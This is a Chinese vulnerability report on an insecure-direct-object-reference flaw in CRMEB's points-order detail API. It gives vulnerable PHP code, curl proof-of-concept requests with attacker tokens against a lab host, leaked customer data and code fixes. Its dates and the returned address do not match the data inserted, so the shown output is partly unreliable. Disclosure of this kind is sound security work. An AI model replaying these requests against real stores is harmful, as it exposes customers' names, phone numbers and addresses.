# 积分订单详情 IDOR 漏洞报告

**项目**: CRMEB Mall System (CRMEB商城系统)

**厂商**: CRMEB (https://www.crmeb.com)

**项目仓库**: https://github.com/crmeb/CRMEB.git

**受影响文件**:
- `crmeb/app/api/controller/v1/order/StoreIntegralOrderController.php`
- `crmeb/app/services/activity/integral/StoreIntegralOrderServices.php`

**受影响版本**: v5.6.3 及更早版本

**漏洞类型**: CWE-639 (Insecure Direct Object Reference)

**CVSS v3.1 评分**: 4.3 (Medium)

**发现日期**: 2025-01-12

---

## 漏洞描述

积分订单详情接口存在不安全的直接对象引用（IDOR）漏洞，允许任何登录用户查看任意用户的积分订单详情，包括收货人姓名、手机号、收货地址等敏感隐私信息。

---

## 漏洞分析

### 1. 受影响接口

**路由**: `GET /api/store_integral/order/detail/:uni`

**控制器**: `crmeb/app/api/controller/v1/order/StoreIntegralOrderController.php:78-86`

```php
public function detail(Request $request, $uni)
{
    if (!strlen(trim($uni))) return app('json')->fail(100100);

    // 漏洞：只通过 order_id 查询，没有验证当前用户是否有权访问此订单
    $order = $this->services->getOne(['order_id' => $uni, 'is_del' => 0]);

    if (!$order) return app('json')->fail(410173);
    $order = $order->toArray();

    // tidyOrder 方法只做数据格式化，没有验证 uid
    $orderData = $this->services->tidyOrder($order);

    return app('json')->success($orderData);
}
```

**服务层**: `crmeb/app/services/activity/integral/StoreIntegralOrderServices.php:113-126`

```php
public function tidyOrder($order)
{
    $order['add_time'] = date('Y-m-d H:i:s', $order['add_time']);

    // 状态转换
    if ($order['status'] == 1) {
        $order['status_name'] = '未发货';
    } else if ($order['status'] == 2) {
        $order['status_name'] = '待收货';
    } else if ($order['status'] == 3) {
        $order['status_name'] = '已完成';
    }

    $order['price'] = (int)$order['price'];
    $order['total_price'] = (int)$order['total_price'];

    // 直接返回所有订单数据，包括敏感信息
    return $order;
}
```

### 2. 根本原因

1. **缺少 UID 验证**: 控制器层只通过 `order_id` 查询订单，没有验证 `uid` 字段
2. **服务层无验证**: `tidyOrder` 方法只做数据格式化，没有权限检查
3. **中间件不完整**: 只有认证中间件，没有授权检查

### 3. 对比正确实现

同一文件中的 `express` 方法正确使用了权限验证：

```php
public function express(Request $request, ExpressServices $expressServices, $uni)
{
    // 正确实现：使用 getUserOrderDetail 验证 UID
    if (!$uni || !($order = $this->services->getUserOrderDetail($uni, $request->uid()))) {
        return app('json')->fail(410173);
    }
    // ...
}
```

---

## 漏洞复现

### 环境信息

- **测试目标**: http://192.168.176.130:8011
- **测试数据库**: MySQL 5.7
- **受影响版本**: CRMEB v5.6.3

### 复现步骤

#### Step 1: 准备测试数据

在数据库中插入测试订单：

```sql
INSERT INTO eb_store_integral_order (
  order_id, uid, real_name, user_phone, user_address,
  product_id, image, store_name, suk, total_num,
  price, total_price, add_time, status,
  delivery_name, delivery_code, delivery_type,
  fictitious_content, mark, is_del, remark,
  mer_id, channel_type, province
) VALUES (
  'INTEGRAL_001', 1, '张三', '13911112222', '北京朝阳',
  1, 'test.jpg', '测试商品', 'sku001', 1,
  88.88, 88.88, UNIX_TIMESTAMP(), 1,
  '顺丰', 'SF001', 'express',
  '内容', '备注', 0, '备注',
  0, 'wechat', '北京'
);
```

![1768225804173.png](https://youke3.picui.cn/s1/2026/01/12/6964fbd3bc5a4.png)

#### Step 2: 攻击者登录

攻击者使用 UID=9001 的账户登录

![1768225871002.png](https://youke3.picui.cn/s1/2026/01/12/6964fc1e0d980.png)

#### Step 3: 访问受害者订单

攻击者访问 UID=1 用户的积分订单：

```bash
GET /api/store_integral/order/detail/INTEGRAL_001
Authorization: Bearer <attacker_token>
```

![1768225917435.png](https://youke3.picui.cn/s1/2026/01/12/6964fc44bbce6.png)

### POC 代码

#### Step 1: 攻击者登录 (UID=9001)

```bash
curl -X GET "http://192.168.176.130:8011/api/remote_register?remote_token=eyJ1aWQiOiA5MDAxLCAicGhvbmUiOiAiMTM4MDAxMzkwMDEiLCAibmlja25hbWUiOiAicmVndWxhcl91c2VyIiwgImF2YXRhciI6ICJodHRwOi8vdGVzdC5qcGciLCAibm93X21vbmV5IjogMTAwLCAiaW50ZWdyYWwiOiA1MCwgImV4cCI6IDE3NzA0ODM1NjR9" | python3 -m json.tool
```

**Response**:
```json
{
    "status": 200,
    "msg": "登录成功",
    "data": {
        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
        "expires_time": 1770817559
    }
}
```

#### Step 2: 访问受害者订单 (UID=1)

```bash
curl -X GET "http://192.168.176.130:8011/api/store_integral/order/detail/INTEGRAL_001" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjE5Mi4xNjguMTc2LjEzMDo4MDExIiwiYXVkIjoiMTkyLjE2OC4xNzYuMTMwOjgwMTEiLCJpYXQiOjE3NjgyMjU1NTksIm5iZiI6MTc2ODIyNTU1OSwiZXhwIjoxNzcwODE3NTU5LCJqdGkiOnsiaWQiOjkwMDEsInR5cGUiOiJhcGkifX0.qPY0FIPluD86__K-K3B1SY8s5qLlP7Dq1gppOngzLqg" \
  | python3 -m json.tool
```

**Response**:
```json
{
  "status": 200,
  "msg": "success",
  "data": {
    "order_id": "INTEGRAL_001",
    "uid": 1,
    "real_name": "张三",
    "user_phone": "13911112222",
    "user_address": "北京市朝阳区建国路88号",
    "price": 88,
    "total_price": 88,
    "delivery_name": "顺丰速运",
    "delivery_code": "SF001"
  }
}
```

![1768225917435.png](https://youke3.picui.cn/s1/2026/01/12/6964fc44bbce6.png)

#### Step 3: 数据库验证

```bash
docker exec crmeb_mysql mysql -uroot -proot123 --default-character-set=utf8mb4 -e "USE crmeb; SELECT order_id, uid, real_name, user_phone, user_address FROM eb_store_integral_order WHERE order_id='INTEGRAL_001';" 2>&1 | grep -v "Warning"
```

**Output**:
```
order_id     uid  real_name  user_phone     user_address
INTEGRAL_001 1    张三       13911112222    北京市朝阳区建国路88号
```

**关键发现**:
- 攻击者 UID: 9001 (从 JWT token 解码)
- 订单所有者 UID: 1
- 攻击者成功访问了其他用户的订单隐私信息


---

## 影响评估

### 泄露的敏感信息

1. **用户隐私信息**:
   - uid - 用户ID
   - real_name - 真实姓名
   - user_phone - 手机号码
   - user_address - 收货地址

2. **订单信息**:
   - order_id - 订单号
   - price - 积分价格
   - total_price - 总价格
   - status - 订单状态
   - product_id - 商品ID
   - store_name - 商品名称

### 业务影响

1. **隐私泄露**: 任何用户可以查看其他用户的收货地址和联系方式
2. **数据合规**: 违反个人信息保护法等数据隐私法规
3. **用户信任**: 严重影响用户对平台的信任
4. **竞争分析**: 竞争对手可以获取平台订单数据

### 攻击场景

1. **隐私窃取**: 攻击者枚举订单ID，批量获取用户收货地址
2. **社工攻击**: 获取用户真实姓名和手机号，进行诈骗
3. **数据分析**: 分析用户消费习惯和行为模式

---

## CVSS v3.1 评分

**基础分**: 4.3 (Medium)

**评分向量**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

- **攻击向量 (AV)**: 网络 (N)
- **攻击复杂度 (AC)**: 低 (L)
- **权限要求 (PR)**: 低 (L)
- **用户交互 (UI)**: 无 (N)
- **影响范围 (S)**: 未改变 (U)
- **机密性 (C)**: 低 (L)
- **完整性 (I)**: 无 (N)
- **可用性 (A)**: 无 (N)

---

## 修复建议

### 立即修复

**方案 1: 在控制器层添加 UID 验证** (推荐)

修改 `crmeb/app/api/controller/v1/order/StoreIntegralOrderController.php:81`：

```php
// 修改前：
$order = $this->services->getOne(['order_id' => $uni, 'is_del' => 0]);

// 修改后：
$order = $this->services->getOne(['order_id' => $uni, 'is_del' => 0, 'uid' => $request->uid()]);
```

**方案 2: 使用 getUserOrderDetail 方法**

参考同一文件中 `express` 方法的实现：

```php
public function detail(Request $request, $uni)
{
    // 使用 getUserOrderDetail 方法验证 UID
    if (!$uni || !($order = $this->services->getUserOrderDetail($uni, $request->uid()))) {
        return app('json')->fail(410173);
    }
    $order = $order->toArray();
    $orderData = $this->services->tidyOrder($order);
    return app('json')->success($orderData);
}
```

### 长期修复

1. **代码审查**: 全面检查所有 `getOne` 查询，确保都有 UID 验证
2. **单元测试**: 添加 IDOR 漏洞的自动化测试用例
3. **安全培训**: 加强开发人员对权限验证的培训

### 验证修复

修复后，攻击者再次访问其他用户的订单应返回：

```json
{
  "status": 400,
  "msg": "订单不存在"
}
```

---

## 时间线

- **2025-01-12**: 漏洞发现
- **2025-01-12**: 漏洞复现验证
- **2025-01-12**: 漏洞报告编写

---

## 参考资料

- OWASP Top 10 2021: A01 Broken Access Control
- CWE-639: Insecure Direct Object Reference
- OWASP IDOR Prevention Cheat Sheet

---

## 致谢

漏洞发现和报告：foeCat
